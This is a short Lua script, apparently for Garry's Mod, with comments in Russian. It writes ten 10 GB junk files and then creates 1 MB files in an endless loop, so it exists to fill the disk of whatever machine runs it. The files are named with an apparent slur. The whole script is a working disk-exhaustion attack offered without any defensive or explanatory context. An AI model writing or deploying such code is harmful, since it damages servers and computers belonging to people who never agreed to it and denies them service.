local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ
local fileIndex = 0

-- 10 файлов по 10 ГБ
for i = 1, 10 do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    if not f then print("Ошибка открытия файла!") return end

    for j = 1, 10240 do -- 10 ГБ = 10240 МБ
        f:Write(one_mb)
    end
    f:Close()
    print("[10GB FILE] Created Igay_" .. fileIndex)
end

-- Бесконечные 1 МБ файлы
while true do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    f:Write(one_mb)
    f:Close()
    print("[1MB FILE] Created Igay_" .. fileIndex)
end
